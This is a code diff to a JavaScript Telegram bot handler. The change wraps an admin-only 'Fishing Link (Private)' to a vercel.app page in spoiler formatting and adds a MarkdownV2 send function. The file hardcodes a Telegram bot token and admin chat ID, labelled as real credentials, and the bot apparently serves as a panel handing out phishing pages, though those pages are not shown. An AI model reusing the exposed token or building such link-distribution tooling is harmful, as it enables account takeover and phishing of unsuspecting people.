@@ -1,4 +1,3 @@
-
 // 🔐 Real credentials
 const TELEGRAM_BOT_TOKEN = '7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY';
 const ADMIN_CHAT_ID = '7216371031';
@@ -34,16 +33,14 @@ export default async function handler(req, res) {
       return res.status(200).send('OK');
     }
 
-    // 🎣 Let’s Fish Button — working for admin & user
+    // 🎣 Let’s Fish Button — with spoiler
     if (callbackQuery?.data === 'fishing') {
       const userId = callbackQuery.message.chat.id.toString();
       const isAdmin = userId === ADMIN_CHAT_ID;
 
       if (isAdmin) {
-        await sendMessageNoMarkdown(
-          userId,
-          `🎣 Fishing Link (Private)\n🔗 https://heavenscake.vercel.app/page.html`
-        );
+        const spoilerLink = '||https://heavenscake.vercel.app/page.html||';
+        await sendSpoilerMessage(userId, `🎣 Fishing Link \\(Private\\)\n🔗 ${spoilerLink}`);
       } else {
         await sendMessageNoMarkdown(
           userId,
@@ -145,6 +142,19 @@ async function sendMessageNoMarkdown(chatId, message) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, text: message })
+  });
+}
+
+// 🕵️ Send spoiler message (MarkdownV2)
+async function sendSpoilerMessage(chatId, message) {
+  return fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'MarkdownV2'
+    })
   });
 }
 
